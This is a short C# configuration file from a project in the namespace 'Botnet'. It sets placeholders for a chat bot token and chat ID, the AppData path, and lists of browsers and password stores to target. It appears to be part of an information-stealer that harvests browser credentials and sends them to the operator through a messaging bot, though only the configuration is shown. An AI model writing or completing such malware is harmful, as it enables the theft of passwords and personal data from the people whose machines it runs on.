using System;

namespace Botnet
{
    class config
    {
        public static char spliter = '|';
        public static string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        public const string Token = "YOUR_TOKEN";
        public const string Chat_ID = "YOUR_CHAT_ID";

        public static string[] browsers =
            {
                "Google",
                "Opera",
                "Yandex",
                "Google 2",
                "Edge",
                "Edge 2"
            };

        public static string[] passes =
    {
                "Google",
                "Opera",
                "Google 2",
                "Yandex",
                "Yandex 2"
            };

        public static string currProc = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
    }
}
